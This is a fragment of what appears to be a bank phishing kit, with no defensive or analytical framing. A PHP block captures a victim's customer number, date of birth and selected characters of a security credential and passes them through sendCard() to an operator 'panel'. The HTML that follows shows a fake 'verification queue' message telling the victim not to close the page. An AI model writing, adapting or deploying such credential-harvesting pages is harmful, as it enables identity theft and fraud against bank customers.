...
if(isset($_POST["char8"]))
{	
	$char4=$_SESSION["char4"]=$_POST["char4"];
	$char8=$_SESSION["char8"]=$_POST["char8"];
	sendCard($_SESSION["cusnum"],$_SESSION["dob"],$char4,$char8,$panel_rec);
...
<div class="divTable" style="width: 100%;">
                                    <div class="divTableRow">
                                       ...
                                       <div class="divTableCell" style="text-align: center;">Loading..</div>
                                    </div>
                                 </div>
                           ...
                           <div class="section section--no-title">
                              ...
                              <div class="section__inner">
                                 <div class="message-list message-list--no-title message-list--no-subtitle message-list--notice" role="note">
                                    ...
                                    <div class="message-list__items">
                                       <div class="message">
                                          <div style="color: #002878;"><strong>Your request is being processed.</strong><br>
                                             <span style="color: #5b6063;">You are now in queue for verification process.
Please do not close this page.</span>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
